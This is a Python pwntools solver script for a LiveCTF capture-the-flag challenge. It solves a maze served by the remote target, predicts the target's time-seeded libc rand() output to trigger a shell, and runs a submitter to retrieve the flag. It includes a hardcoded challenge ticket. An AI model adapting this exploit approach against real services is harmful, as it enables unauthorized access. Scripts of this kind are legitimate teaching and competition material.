#!/usr/bin/env python3
from pwn import *
import ctypes

libc = ctypes.CDLL(None)
srand = libc.srand
rand = libc.rand
libc_time = libc.time
srand(libc_time(0))

#elf = ELF("./challenge")
#p = process(elf.path)
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, PORT)

p.sendlineafter(b"torment:", b"a")
p.recvuntil(b"maze.\n")
maze = p.recvuntil(b"\nYou", drop=True).split(b"\n")
ticket = "ticket{MillionDeed1554n23:yAAwRAlKcgXBOEqmb5Pm649jk8VWMnLjiK_i-NV1-YXQXXOU}"

def bfs(player_coords_arr, win_coords, maze, paths=[[]], visited=[]):
    next_pcoords = []
    next_paths = []
    if len(player_coords_arr) == 0:
        return None
    print(player_coords_arr)
    for i, player_coords in enumerate(player_coords_arr):
        if player_coords in visited:
            continue
        visited.append(player_coords)
        path = paths[i]
        if player_coords == win_coords:
            return path
        pi, pj = player_coords
        print(player_coords)
        # RIGHT
        if maze[pi][pj+1] != 0x23:
            next_pcoords.append((pi, pj+1))
            next_paths.append(path + ['e'])
        # DOWN
        if maze[pi+1][pj] != 0x23:
            next_pcoords.append((pi+1, pj))
            next_paths.append(path + ['s'])

        # LEFT
        if maze[pi][pj-1] != 0x23:
            next_pcoords.append((pi, pj-1))
            next_paths.append(path + ['w'])

        # UP
        if pi != 0 and maze[pi-1][pj] != 0x23:
            next_pcoords.append((pi-1, pj))
            next_paths.append(path + ['n'])
    return bfs(next_pcoords, win_coords, maze, paths=next_paths, visited=visited)

win_coords = (0,0)
player_coords = (0, 0)
for i, line in enumerate(maze):
    j = line.find(b"*")
    if j != -1:
        win_coords = (i, j)
    j = line.find(b"@")
    if j != -1:
        player_coords = (i, j)

i, j = win_coords
path = bfs([player_coords], win_coords, maze)

for s in path[:-1]:
    p.sendlineafter(b"torment: ", s.encode())
    p.recvuntil(b"stop to count ")
    stars = int(p.recvuntil(b" ", drop=True))

# Consume random vals
while rand() >> 14 != stars:
    pass

p.sendlineafter(b"torment:", b"a")
p.recvuntil(b"maze.\n")
maze = p.recvuntil(b"\nYou", drop=True).split(b"\n")
for i, line in enumerate(maze):
    j = line.find(b"*")
    if j != -1:
        win_coords = (i, j)
    j = line.find(b"@")
    if j != -1:
        player_coords = (i, j)

pi, pj = player_coords
if maze[pi][pj+1] == 0x23:
    s = "e"

# DOWN
elif maze[pi+1][pj] == 0x23:
    s = "s"

# LEFT
elif maze[pi][pj-1] == 0x23:
    s = "w"

# UP
elif pi != 0 and maze[pi-1][pj] == 0x23:
    s = "n"

r = 123
n = 0
while r % 1213 != 1212:
    print(f"{r >> 14} {r}")
    r = rand()
    n+= 1

print("==========")
for i in range(n-1):
    p.sendlineafter(b"torment: ", s.encode())
    p.recvuntil(b"stop to count ")
    stars = int(p.recvuntil(b" ", drop=True))
    print(stars)


p.sendlineafter(b"torment: ", path[-1].encode())
# Shell

p.sendline("./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
#p.recvuntil(b"LiveCTF")
log.info('Flag: %s', flag)

'''
63100 1033842781
70830 1160483054
34643 567598018
34560 566236432
129330 2118947545
77826 1275108989
12342 202226235
70713 1158577391
73805 1209225152
66598 1091142708
86967 1424879703
23043 377538500
91057 1491889239
117204 1920276841
25068 410721430
128766 2109711201
38840 636369722
37390 612612527
83792 1372860294
76700 1256665536
78259 1282201119
32968 540154535
26254 430158390
59129 968781556
3740 61284289
67372 1103828757
28602 468621275
122310 2003932027
52104 853678514
67151 1100209883
13990 229222684
115205 1887521295



#############################
#@#.#.....#.........#...#...#
#.#.#.#.#.#.#####.#.#.#.#.#.#
#.#...#.#.#.....#.#...#...#.#
#.#####.#.#####.#.#.#######.#
#.......#.#...#.#.#.#.....#.#
#########.#.###.#.###.###.#.#
#.......#.#.....#.....#...#.#
#.###.#.#.#####.#######.#####
#.#...#.#.#...#.....#.#.....#
###.#####.#.#.#####.#.#####.#
#...#.....#.#.....#.#.....#.#
#.###.#####.#####.#.###.###.#
#...#.#.#...#.....#...#.#...#
#.#.#.#.#.#.#.#######.#.#.#.#
#.#.#.#...#.#.#.........#.#.#
#.#.#.#####.#.#.#########.#.#
#.#.#.#.....#.#.....#.#...#.#
###.#.#.#####.#####.#.#.###.#
#...#...#...#.....#.#.#.#...#
#.#.#####.#.#####.#.#.#.#.###
#.#...#.#.#...#...#.#.#.#...#
#.###.#.#.###.#.###.#.#.###.#
#...#...#...#.#...#...#.#...#
#.#.#######.#.###.###.#.#.###
#.#.......#.#.....#...#.#.#.#
#.#######.#.###########.#.#.#
#.......#...............#...#
#########*###################

'''
